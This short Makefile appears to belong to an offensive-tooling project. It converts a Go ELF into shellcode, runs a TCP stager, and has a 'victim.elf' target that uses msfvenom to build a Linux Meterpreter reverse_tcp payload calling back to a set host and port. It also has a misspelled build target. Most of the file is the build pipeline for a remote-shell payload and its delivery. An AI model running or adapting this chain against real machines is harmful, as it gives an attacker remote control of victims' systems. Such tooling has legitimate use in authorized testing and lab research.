LHOST=127.0.0.1

all: convert2bin victim.elf
all: tcp-stager

elf2bin:
	$(cc) -o elf2bin elf2bin/elf2bin.c elf2bin/elf.h  elf2bin/util-common.h

smaple:
	GOOS=linux GOARCH=amd64 go build -buildmode=PIE -static -o sample.elf example/

convert2bin: elf2bin sample
	./elf2bin sample.elf shellcode.elf

tcp-stager:
	go run main.go

victim.elf:
	msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$(LHOST) LPORT=4444 -f elf -o victim.elf
